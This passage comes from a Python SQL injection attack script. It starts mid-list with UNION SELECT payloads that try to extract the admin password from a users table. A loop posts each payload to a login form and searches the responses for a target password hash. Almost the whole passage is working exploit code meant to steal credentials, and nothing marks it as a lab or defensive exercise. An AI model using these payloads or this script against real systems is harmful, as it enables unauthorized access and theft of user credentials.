    ("' UNION SELECT password,1 FROM users WHERE username='admin'-- ", "test"),
    ("' UNION SELECT 1,password,3 FROM users WHERE username='admin'-- ", "test"),
    ("' UNION SELECT password,2,3 FROM users WHERE username='admin'-- ", "test"),
    
    # Try with NULL
    ("' UNION SELECT password,NULL FROM users WHERE username='admin'-- ", "test"),
    ("' UNION SELECT NULL,password FROM users WHERE username='admin'-- ", "test"),
]

for username, password in union_extraction:
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        
        # Check if response contains hash pattern (32 hex chars)
        if len(response.text) > 30 and any(c in response.text for c in '0123456789abcdef'):
            print(f"\n[+] Potential data extraction:")
            print(f"    Payload: {username[:60]}")
            print(f"    Response: {response.text}")
            
            # Check if target hash appears
            if target_hash in response.text:
                print(f"[!] TARGET HASH FOUND IN RESPONSE!")
                
    except Exception as e:
        print(f"[-] Error: {e}")

